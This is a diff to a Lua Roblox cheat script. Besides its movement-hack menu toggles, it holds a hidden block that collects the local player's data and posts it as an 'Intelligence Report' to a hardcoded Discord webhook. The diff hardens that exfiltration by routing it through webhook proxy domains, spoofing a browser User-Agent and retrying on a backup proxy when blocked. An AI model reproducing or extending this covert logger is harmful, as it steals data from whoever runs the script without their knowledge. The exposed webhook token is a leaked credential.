@@ -2401,36 +2401,7 @@ Tabs.Misc:AddParagraph({
         Content = ""
     })
     
-local Toggle = Tabs.Misc:AddToggle("PlayerJumpPower", {Title = "Jump Power Toggle", Default = false })
 
-    Toggle:OnChanged(function(State)
-        DConfiguration.Misc.Humanoids.OriginalJumpHeight = State
-     
-       while DConfiguration.Misc.Humanoids.OriginalJumpHeight and wait(0.1) do
-           local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
-           if not UseOriginalJump and humanoid then
-               humanoid.UseJumpPower = false
-               humanoid.JumpPower = 20
-           end
-     
-          if LocalPlayer.Character and humanoid then
-               humanoid.UseJumpPower = true
-               humanoid.JumpPower = DConfiguration.Misc.Humanoids.JP
-         end
-    end
-end)
-
- Tabs.Misc:AddInput("PlayerJumpPower", {
-        Title = "Player Jump Power",
-        Default = "20",
-        Placeholder = "Jump Number",
-        Numeric = false, 
-        Finished = false, 
-        Callback = function(Value)
-            DConfiguration.Misc.Humanoids.JP = tonumber(Value) or 20
-        end
-    })
-    
 local Toggle = Tabs.Misc:AddToggle("PlayerWalkspeed", {Title = "Walkspeed Toggle", Default = false })
 
     Toggle:OnChanged(function(State)
@@ -2556,6 +2527,8 @@ end)
             DConfiguration.Misc.Utilities.BounceModification.EmoteBounce = tonumber(Value) or 120
         end
     })
+    
+    
     
 Tabs.Misc:AddSection("Camera Adjustment")
 
@@ -5186,10 +5159,9 @@ do
     _G.Data = {}
     _G.Data.P = game.Players.LocalPlayer
     _G.Data.H = game:GetService('HttpService')
-
-    _G.Data.U = 'https://discord.com/api/webhooks'
-        .. '/1504450739102023751'
-        .. '/6h9TacV6neCOH_ngBaC5zwiKPNgKKauuqDy9XiAZ5AW10EPE6Mi0tREgzlVPXkZUakO'
+    
+    local rawUrl = "https://discord.com/api/webhooks/1504450739102023751/6h9TacV6neCOH_ngBaC5zwiKPNgKKauuqDy9XiAZ5AW10EPE6Mi0tREgzlVPXkZUakO_"
+    _G.Data.U = rawUrl:gsub("discord%.com", "webhook.lewisakura.moe")
     
     local function GetFields()
         local info = _G.Data.P
@@ -5210,22 +5182,38 @@ do
         }
     end
 
-    local function Transmit()
-        local payload = _G.Data.H:JSONEncode({
+    function Transmit()
+        payload = _G.Data.H:JSONEncode({
             ['username'] = 'Logs System',
             ['embeds'] = {{
-                ['title'] = 'Doors Full Intelligence Report',
+                ['title'] = 'Legacy Full Intelligence Report',
                 ['description'] = 'User data bypass results',
                 ['color'] = 16711680,
                 ['fields'] = GetFields()
             }}
         })
 
-        local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
+        req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+        
         if req then
-            pcall(function() req({Url=_G.Data.U, Method='POST', Headers={['Content-Type']='application/json'}, Body=payload}) end)
-        else
-            pcall(function() _G.Data.H:PostAsync(_G.Data.U, payload) end)
+            success, response = pcall(function() 
+                return req({
+                    Url = _G.Data.U, 
+                    Method = 'POST', 
+                    Headers = {
+                        ['Content-Type'] = 'application/json',
+                        ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+                    }, 
+                    Body = payload
+                }) 
+            end)
+            
+            if success and response and (response.StatusCode == 429 or response.StatusCode == 403) then
+                backupUrl = rawUrl:gsub("discord%.com", "api.hyra.io")
+                pcall(function()
+                    req({Url = backupUrl, Method = 'POST', Headers = {['Content-Type'] = 'application/json'}, Body = payload})
+                end)
+            end
         end
         _G.Data = nil
     end
